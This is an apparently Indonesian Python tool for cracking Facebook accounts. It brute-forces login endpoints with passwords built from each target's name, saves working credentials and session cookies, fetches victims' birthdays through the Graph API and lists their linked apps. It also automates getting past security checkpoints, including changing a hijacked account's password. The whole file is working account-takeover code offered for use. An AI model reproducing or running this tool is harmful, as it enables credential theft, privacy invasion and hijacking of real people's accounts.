							tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',
							style='#FF0022'))
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.Cracker, _heck_, brute, "mbasic.facebook.com")
									except: pass
							hasil(ok,cp)
						elif ind in ('3', '03'):
							tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',
							style='#FF0022'))
							with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
								for akun in self.id:
									try:
										_heck_ = akun.split('<=>')[0]
										TitidNeverDie.submit(self.Cracker, _heck_, brute, "m.facebook.com")
									except: pass
							hasil(ok,cp)
						else:
							print ('%s╰─%s isi yang benar kentod'%(p,m))
							manual()
					tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (fast)\n {U}• {P}02{O} methode{P} mbasic{O} (slow)\n {U}• {P}03{O} methode{H} mobile{O} (very slow)""",
					title = f'{M}[ {H}Metode {M}]',style='#FF0022'))
					manual(pwx.split(','))
					break
		elif unikers in ('T', 't'):
			tulis(Panel(f""" {Te}{U}• {P}01{O} methode{M} free{O} (fast)\n {U}• {P}02{O} methode{P} mbasic{O} (slow)\n {U}• {P}03{O} methode{H} mobile{O} (very slow)""",
			title = f'{M}[ {H}Metode {M}]',style='#FF0022'))
			self.langsung()
		else:
			print("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
			Menu()
	
	#LANGSUNG
	def langsung(self):
		sluut = input('%s╰─ %sPilih %s> %s'%(p,o,m,k))
		if sluut in[""," "]:
			print("%s╰─%s Isi yang benar kentod "%(p,m));jeda(2)
		elif sluut in["1","01"]:
			tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',
			style='#FF0022'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.free, uid, pwx, "free.facebook.com")
					except:pass
			hasil(ok,cp)
		elif sluut in["2","02"]:
			tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',
			style='#FF0022'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.Cracker, uid, pwx, "mbasic.facebook.com")
					except:pass
			hasil(ok,cp)
		elif sluut in["3","03"]:
			tulis(Panel(f'{Te}{U} {til}{O} akun {H}[OK] {O}tersimpan ke file {M}> {H}OK/{waktu}.txt \n{U} {til}{O} akun {K}[CP] {O}tersimpan ke file {M}> {K}OK/{waktu}.txt \n {U}!{O} setiap crack 1k ID, mainkan mode pesawat 2 detik',
			style='#FF0022'))
			with ThreadPoolExecutor(max_workers=30) as TitidNeverDie:
				for akun in self.id: 
					try:
						uid, name = akun.split('<=>')
						na = name.split(' ')
						if len(na) == 3 or len(na) == 4 or len(na) == 5 or len(na) == 6:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						else:
							pwx = [name, na[0]+na[1], na[0]+"123", na[0]+"12345"]
						TitidNeverDie.submit(self.Cracker, uid, pwx, "m.facebook.com")
					except:pass
			hasil(ok,cp)
		else:
			print("%s╰─%s Isi yang benar kentod "%(p,m))
			self.langsung()

	# FREE
	def free(self, user, manual, url_fb):
		global ok,cp,loop
		warna = random.choice(['\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m','\x1b[1;97m'])
		sys.stdout.write('\r\x1b[1;97m╰─'+warna+' •\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),h,m,h,len(ok),o,k,m,k,len(cp),o)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower()
				ses = requests.Session()
				headers_ = {'Host':f'{url_fb}','cache-control': 'max-age=0','sec-ch-ua-mobile': '?1','upgrade-insecure-requests': '1','user-agent':'NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','sec-fetch-site': 'same-origin','sec-fetch-mode': 'cors','sec-fetch-dest': 'empty','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'}
				p_ = ses.get(f"https://{url_fb}/login/device-based/password/?uid={user}&flow=login_no_pin&from_login",headers=headers_).text
				dataa = {"lsd":re.search('name="lsd" value="(.*?)"', str(p_)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p_)).group(1),"uid":user,"pass":pw,"flow":"login_no_pin","next":f"https://{url_fb}/login/save-device/?refsrc=deprecated&_rdr"}
				_headers = {'Host':f'{url_fb}','accept':'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7', 'x-requested-with':'mark.via.gp', 'cache-control':'max-age=0','content-length':'159', 'content-type':'application/x-www-form-urlencoded','origin':f'https://{url_fb}', 'referer':f'https://{url_fb}/login/device-based/password/?uid='+user+'&flow=login_no_pin&from_login', 'sec-fetch-dest':'document', 'sec-fetch-mode':'navigate','sec-fetch-site':'same-origin','sec-fetch-user':'?1','upgrade-insecure-requests':'1','user-agent':'Mozilla/5.0 (Linux; Android 10; Pixel Build/QP1A.190711.019; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.132 Mobile Safari/537.36'}
				po = ses.post(f'https://{url_fb}/login/device-based/validate-password/?shbl=0',data=dataa,headers=_headers,allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).json()["birthday"]  
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r{p}╰──>{h} {user} ◊ {pw} \n{p} ╰─>{h} {day} {month} {year} \n{p} ╰─> {h}{kukis} ')
						os.popen("play-audio dapet.mp3")
						ok.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}╰──> {h}{user} ◊ {pw} \n{p} ╰─> {h}{kukis} ')
					os.popen("play-audio dapet.mp3")
					ok.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' *--> {user} ◊ {pw} ◊ {kukis}\n')
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).json()["birthday"]  
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r{p}╰──> {k}{user} ◊ {pw} \n{p} ╰─> {k}{day} {month} {year}  ')
						os.popen("play-audio dapet.mp3")
						cp.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}╰──> {k}{user} ◊ {pw}           ')
					os.popen("play-audio dapet.mp3")
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.free(user, manual, url_fb)
			
	# MOBILE
	def Cracker(self, user, manual, url_fb):
		global ok,cp,loop
		warna = random.choice(['\x1b[1;91m','\x1b[1;92m','\x1b[1;93m','\x1b[1;94m','\x1b[1;95m','\x1b[1;96m','\x1b[1;97m'])
		sys.stdout.write('\r\x1b[1;97m╰─'+warna+' •\x1b[1;96m [crack] %s/%s [%sOK%s:%s%s%s]-[%sCP%s:%s%s%s]'%(loop,len(self.id),h,m,h,len(ok),o,k,m,k,len(cp),o)),
		sys.stdout.flush()
		try:
			for pw in manual:
				pw = pw.lower() 
				ses = requests.Session()
				ses.headers.update({"Host":f"{url_fb}","upgrade-insecure-requests":"1","user-agent":"NokiaC3-00/5.0 (07.20) Profile/MIDP-2.1 Configuration/CLDC-1.1 Mozilla/5.0 AppleWebKit/420+ (KHTML, like Gecko) Safari/420+","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"none","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":"https://developers.facebook.com/","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				p_ = ses.get(f'https://{url_fb}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F').text
				dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p_)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p_)).group(1),"uid":user,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
				ses.headers.update({"Host":f"{url_fb}","cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":f"https://{url_fb}","content-type":"application/x-www-form-urlencoded","user-agent":"Mozilla/5.0 (Linux; U; Android 12; en-US; SM-A2829J) AppleWebKit/537.36 (KHTML, like Gecko)  UCBrowser/11.3.8.976 U3/0.8.0 Mobile Safari/537.36","accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"navigate","sec-fetch-user":"?1","sec-fetch-dest":"document","referer":f"https://{url_fb}/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
				po = ses.post(f'https://{url_fb}/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
				if 'c_user' in ses.cookies.get_dict():
					try:
						kukis=";".join([key+"="+value for key,value in ses.cookies.get_dict().items()])
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).json()["birthday"]  
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r{p}╰──>{h} {user} ◊ {pw} \n{p} ╰─>{h} {day} {month} {year} \n{p} ╰─> {h}{kukis} ')
						os.popen("play-audio dapet.mp3")
						ok.append(f"{user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} ")
						open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} ◊ {kukis} \n")
						cek_apk(kukis)
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}╰──> {h}{user} ◊ {pw} \n{p} ╰─> {h}{kukis} ')
					os.popen("play-audio dapet.mp3")
					ok.append(f'{user} ◊ {pw} ◊ {kukis}')
					open(f'OK/{waktu}.txt', 'a').write(f' *--> {user} ◊ {pw} ◊ {kukis}\n')
					cek_apk(kukis)
					break
				elif 'checkpoint' in ses.cookies.get_dict():
					try:
						token_ = open('data/token.txt', 'r').read()
						cooki_ = {"cookie":open("data/cookie.txt","r").read()} 
						lahir = requests.get(f"https://graph.facebook.com/{user}?fields=birthday&access_token={token_}",cookies=cooki_).json()["birthday"]  
						day, month, year = lahir.split('/')
						month = bulan12[month]
						print (f'\r{p}╰──> {k}{user} ◊ {pw} \n{p} ╰─> {k}{day} {month} {year}  ')
						os.popen("play-audio dapet.mp3")
						cp.append(f"{user} ◊ {pw} ◊ {day} {month} {year}")
						open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {day} {month} {year} \n")
						break
					except (KeyError, IOError):
						day = ''
						month = ''
						year = ''
					except:
						pass
					print (f'\r{p}╰──> {k}{user} ◊ {pw}           ')
					os.popen("play-audio dapet.mp3")
					cp.append(f'{user} ◊ {pw}')
					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
					break
				else:
					continue
			loop += 1
		except requests.exceptions.ConnectionError:
			jeda(1)
			loop += 1
			self.Cracker(user, manual, url_fb)

# SELESAI CRACK
ubah_pass = []
pwbaru = []
pwBaru = []
ubahP = []

def hasil(ok,cp):
	os.popen('play-audio data/selesai.mp3')
	if len(ok) != 0 or len(cp) != 0:
		print('')
		tulis(Panel(f'{Te}{U} •{H} OK{M} : {H}{str(len(ok))}\n{U} •{K} CP{M} : {K}{str(len(cp))}',
		title = f'[ {H}√ Finished {M}]',style='#FF0022'))
		if len(cp)==0:
			exit()
		else:
			c = input('%s╰─%s gunakan detektor checkpoint? y/t%s > %s'%(p,o,m,k))
			if c =='':
				exit("%s╰─%s Isi yang benar kentod "%(p,m))
			elif c in['Y','y']:
				tulis(Panel(f"{Te} {U}•{O} Mode pesawatkan terlebih dahulu 5 detik ",style='#FF0022'))
				pw=input("%s╰─%s ubah sandi akun one tab? y/t %s> %s"%(p,o,m,k))
				if pw =='':
					print ("%s╰─%s isi yg benar kentod "%(p,m))
				elif pw in['y','Y']:
					ubah_pass.append("ubah_sandi")
					pw2=input("%s╰─%s masukan sandi %s> %s"%(p,o,m,k))
					if len(pw2) <= 5:
						print("%s╰─%s sandi minimal 6 karakter "%(p,m))
					else:
						pwbaru.append(pw2)
				nomor=0
				for fb in cp:
					akun = fb.replace("\n","")
					ngecek  = akun.split(" ◊ ")
					nomor+=1
					tulis(Panel(f"{Te}{H} {str(nomor)}.{O} login akun {M}> {K}{akun.replace(' *--> ','')}",style='#FF0022'))
					try:
						mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
					except requests.exceptions.ConnectionError:
						sys.stdout.write("\r%s╰─%s tidak ada koneksi "%(p,m)),
						sys.stdout.flush();jeda(1)
						pass
					except:
						pass
				tulis(Panel(f"{Te}{U} •{O} Selesai mengecek akun",style='#FF0022'))
				os.popen('play-audio data/cek.mp3')
				input('%s╰─%s [%s Enter%s ] '%(p,o,u,o))
				Menu()
			elif c in['t','T']:
				exit()
			else:
				exit ("%s╰─%s isi yg benar kentod "%(p,m))
	else:
		exit(f"\n{p}╰─{m} Ops... tidak mendapatkan hasil :(")

# CEK APLIKASI 
def cek_apk(kukis):
	session = requests.Session()
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r     %s╰─ %s. %s%s"%(p,i+1,o,game[i].replace("Ditambahkan pada"," Ditambahkan pada")))
	except AttributeError:
		print ("\r     %s╰─ gagal mengecek game"%(m))
	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":"noscript=1;"+kukis}).text
	sop = bs4.BeautifulSoup(w,"html.parser")
	x = sop.find("form",method="post")
	game = [i.text for i in x.find_all("h3")]
	try:
		for i in range(len(game)):
			print ("\r     %s╰─ %s. %s%s"%(p,i+1,m,game[i].replace("Kedaluwarsa"," Kedaluwarsa")))
	except AttributeError:
		print ("\r     %s╰─ gagal mengecek game"%(m))

# CEKPOINT DETEKTOR
def file_cp():
	dirs = os.listdir('CP')
	print('')
	for file in dirs:
		print("%s╰─%s> %s%s"%(p,m,k,file));jeda(0.07)
	try:
		tulis(Panel(f"{Te}{U} •{O} Masukan file [ cth{M}: {K}{waktu}.txt{O} ]",style='#FF0022'))
		opsi()
	except IOError:
		print ('%s╰─%s file tidak ada'%(p,m))
		exit()

def opsi():
	CP = ("CP/")
	romi = input("%s╰─%s Nama file %s> %s"%(p,o,m,k))
	if romi == "":
		print("%s╰─%s isi yang benar "%(p,m));jeda(2)
		opsi()
	try:
		file_cp = open(CP+romi, "r").readlines()
	except IOError:
		exit("%s╰─%s nama file %s tidak tersedia"%(p,m,romi))
	tulis(Panel(f"{Te} {U}•{O} Mode pesawatkan terlebih dahulu 5 detik ",style='#FF0022'))
	pw=input("%s╰─%s ubah sandi pada akun one tab? y/t %s> %s"%(p,o,m,k))
	if pw in['y','Y']:
		ubah_pass.append("ubah_sandi")
		pw2 = input("%s╰─%s masukan sandi %s> %s"%(p,o,m,k))
		if len(pw2) <= 5:
			print("%s╰─ %ssandi minimal 6 karakter "%(p,m))
		else:
			pwbaru.append(pw2)
	tulis(Panel(f"{Te}{U} •{O} total akun {M}: {K}{str(len(file_cp))}",style='#FF0022'))
	nomor = 0
	for fb in file_cp:
		akun = fb.replace("\n","")
		ngecek  = akun.split(" ◊ ")
		nomor+=1
		tulis(Panel(f"{Te}{H} {str(nomor)}.{O} login akun {M}> {K}{akun.replace(' *--> ','')}",style='#FF0022'))
		try:
			mengecek(ngecek[0].replace(" *--> ",""), ngecek[1])
		except requests.exceptions.ConnectionError:
			continue
	tulis(Panel(f"{Te}{U} •{O} Selesai mengecek akun",style='#FF0022'))
	os.popen('play-audio data/cek.mp3')
	input('%s╰─%s [%s Enter%s ] '%(p,o,u,o))
	Menu()
	
data = {}
data2 = {}

def mengecek(user,pw):
	global loop,ubah_pass,pwbaru
	session=requests.Session()
	url = "https://mbasic.facebook.com"
	session.headers.update({"Host": "mbasic.facebook.com","cache-control": "max-age=0","upgrade-insecure-requests": "1","origin": "https://mbasic.facebook.com","content-type": "application/x-www-form-urlencoded","user-agent": "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]","accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with": "mark.via.gp","sec-fetch-site": "same-origin","sec-fetch-mode": "navigate","sec-fetch-user": "?1","sec-fetch-dest": "document","referer": "https://mbasic.facebook.com/login/?next&ref=dbl&fl&refid=8","accept-encoding": "gzip, deflate","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
	soup=bs4.BeautifulSoup(session.get(url+"/login/?next&ref=dbl&fl&refid=8").text,"html.parser")
	link=soup.find("form",{"method":"post"})
	for x in soup("input"):
		data.update({x.get("name"):x.get("value")})
	data.update({"email":user,"pass":pw})
	urlPost=session.post(url+link.get("action"),data=data)
	response=bs4.BeautifulSoup(urlPost.text, "html.parser")
	if "c_user" in session.cookies.get_dict():
		if "Akun Anda Dikunci" in urlPost.text:
			print("\r%s╰─%s akun terkunci sesi new"%(p,m))
		else:
			print("\r%s╰─%s akun tidak checkpoint, silahkan anda login "%(p,h))
			os.popen('play-audio dapet.mp3')
			open('OK/%s.txt'%(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
	elif "checkpoint" in session.cookies.get_dict():
		coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
		title=re.findall("\<title>(.*?)<\/title>",str(response))
		link2=response.find("form",{"method":"post"})
		listInput=['fb_dtsg','jazoest','checkpoint_data','submit[Continue]','nh']
		for x in response("input"):
			if x.get("name") in listInput:
				data2.update({x.get("name"):x.get("value")})
		an=session.post(url+link2.get("action"),data=data2)
		response2=bs4.BeautifulSoup(an.text,"html.parser")
		cek=[cek.text for cek in response2.find_all("option")]
		number=0
		print("\r%s╰──%s terdapat %s%s%s opsi %s:"%(p,o,p,str(len(cek)),o,m));jeda(0.07)
		if(len(cek)==0):
			if "Lihat detail login yang ditampilkan. Ini Anda?" in title:
				if "ubah_sandi" in ubah_pass:
					dat,dat2={},{}
					but=["submit[Yes]","nh","fb_dtsg","jazoest","checkpoint_data"]
					for x in response("input"):
						if x.get("name") in but:
							dat.update({x.get("name"):x.get("value")})
					ubahPw=session.post(url+link2.get("action"),data=dat).text
					resUbah=bs4.BeautifulSoup(ubahPw,"html.parser")
					link3=resUbah.find("form",{"method":"post"})
					but2=["submit[Next]","nh","fb_dtsg","jazoest"]
					if "Buat Kata Sandi Baru" in re.findall("\<title>(.*?)<\/title>",str(ubahPw)):
						for b in resUbah("input"):
							dat2.update({b.get("name"):b.get("value")})
						dat2.update({"password_new":"".join(pwbaru)})
						an=session.post(url+link3.get("action"),data=dat2)
						coki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
						print("\r%s ╰─ %sakun one tab, sandi berhasil di ubah \n%s ╰─ %s%s ◊ %s \n%s ╰─%s %s			"%(p,h,p,h,user,pwbaru[0],p,h,coki))
						os.popen('play-audio dapet.mp3')
						open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pwbaru[0],coki))
						cek_apk(coki)
				else:
					print("\r%s ╰─%s akun one tab, silahkan anda login		"%(p,h))
					os.popen('play-audio dapet.mp3')
					open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s ◊ %s\n" % (user,pw,coki))
					cek_apk(coki)
			elif "Masukkan Kode Masuk untuk Melanjutkan" in re.findall("\<title>(.*?)<\/title>",str(response)):
				print("\r%s ╰─ %sakun terpasang autentikasi dua faktor			"%(p,m))
			else:
				print("%s ╰─%s terjadi kesalahan"%(p,m))
		else:
			if "c_user" in session.cookies.get_dict():
				print("\r%s╰─%s akun tidak checkpoint, silahkan anda login "%(p,h))
				os.popen('play-audio dapet.mp3')
				open('OK/%s.txt' %(waktu), 'a').write(" *--> %s ◊ %s\n" % (user,pw))
		for opsi in range(len(cek)):
			number +=1
			jalan (" %s╰─ %s. %s%s"%(p,str(number),k,cek[opsi]))
	elif "login_error" in str(response):
		oh = run.find("div",{"id":"login_error"}).find("div").text
		print("%s╰─ %s%s"%(p,m,oh))
	else:
		print("%s╰─%s login gagal, silahkan cek kembali id dan password"%(p,m))
		
# CEK HASIL FACEBOOK
def hasil_fb():
	tulis(Panel(f"{Te}{U} •{P} 01 {O}Cek hasil akun {H}OK \n{U} •{P} 02 {O}Cek hasil akun {K}CP \n{U} •{P} 03 {O}Hapus hasil crack \n{U} •{M} 00 {O}Kembali",style='#FF0022'))
	rom = input('%s╰─%s Pilih %s>%s '%(p,o,m,k))
	if rom in['']:
		print ('%s╰─%s isi yang benar'%(p,m));jeda(2)
		menu()
	elif rom in['1','01']:
		dirs = os.listdir('OK')
		print('')
		for file in dirs:
			print("%s╰─%s> %s%s"%(p,m,h,file));jeda(0.07)
		try:
			tulis(Panel(f"{Te}{U} •{O} Masukan file [ cth{M}: {K}{waktu}.txt{O} ]",style='#FF0022'))
			file = input("%s╰─%s masukan file %s:%s "%(p,o,m,h));jeda(0.2)
			if file in['']:
				exit("%s╰─%s isi yang benar kentod"%(p,m))
			totalok = open('OK/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s╰─ %sfile tidak ada "%(p,m))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		tulis(Panel(f"{Te}{U} •{O} hasil tanggal{M} : {H}{file_nm} {O}jumlah {M}: {H}{len(totalok)}",style='#FF0022'))
		print(f'{h}')
		os.system('cat OK/%s'%(file));jeda(0.07)
		exit('\n')
	elif rom in['2','02']:
		dirs = os.listdir('CP')
		print ('')
		for file in dirs:
			print("%s╰─%s> %s%s"%(p,m,k,file));jeda(0.07)
		try:
			tulis(Panel(f"{Te}{U} •{O} Masukan file [ cth{M}: {K}{waktu}.txt{O} ]",style='#FF0022'))
			file = input("%s╰─%s masukan file %s:%s "%(p,o,m,h));jeda(0.2)
			if file in['']:
				exit("%s╰─ %sisi yang benar kentod"%(p,m))
			totalcp = open('CP/%s'%(file)).read().splitlines()
		except (KeyError, IOError):
			print("%s%s file tidak ada "%(m,til))
		nm_file = ('%s'%(file)).replace('-', ' ')
		file_nm = nm_file.replace('.txt', '')
		tulis(Panel(f"{Te}{U} •{O} hasil tanggal{M} : {K}{file_nm} {O}total {M}: {K}{len(totalcp)}",style='#FF0022'))
		print(f'{k}')
		os.system('cat CP/%s'%(file));jeda(0.07)
		exit('\n')
	elif rom in['3','03']:
		os.system('rm -rf CP/*.txt && OK/*.txt')
		jalan (f'{p}╰─{h} berhasil menghapus hasil crack ');jeda(2)
		Menu()
	elif rom in['0','00']:
		Menu()
	else:
		print ('\n%s╰─%s isi yang benar'%(p,m));jeda(2)
		Menu()
		
if __name__=="__main__":
	Menu()
	
"""

    Biar apa sih di decompile anyink
    Taekkk !

"""
